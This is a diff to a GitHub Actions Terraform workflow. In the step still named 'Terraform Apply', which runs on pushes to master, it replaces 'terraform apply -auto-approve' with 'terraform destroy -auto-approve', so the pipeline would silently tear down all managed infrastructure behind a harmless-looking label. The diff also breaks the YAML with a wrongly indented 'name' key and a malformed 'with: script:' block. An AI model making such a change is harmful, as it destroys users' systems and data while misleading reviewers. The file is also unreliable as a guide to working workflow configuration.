@@ -1,4 +1,4 @@
-name: "Terraform"
+    name: "Terraform"
 
 on:
   push:
@@ -62,9 +62,12 @@ jobs:
             })
 
       - name: Terraform Plan Status
+        with:
+          script: |
+            #### Terraform Plan check 📖\`${{ steps.plan.outcome }}\`
         if: steps.plan.outcome == 'failure'
         run: exit 1
 
       - name: Terraform Apply
         if: github.ref == 'refs/heads/master' && github.event_name == 'push'
-        run: terraform apply -auto-approve
+        run: terraform destroy -auto-approve
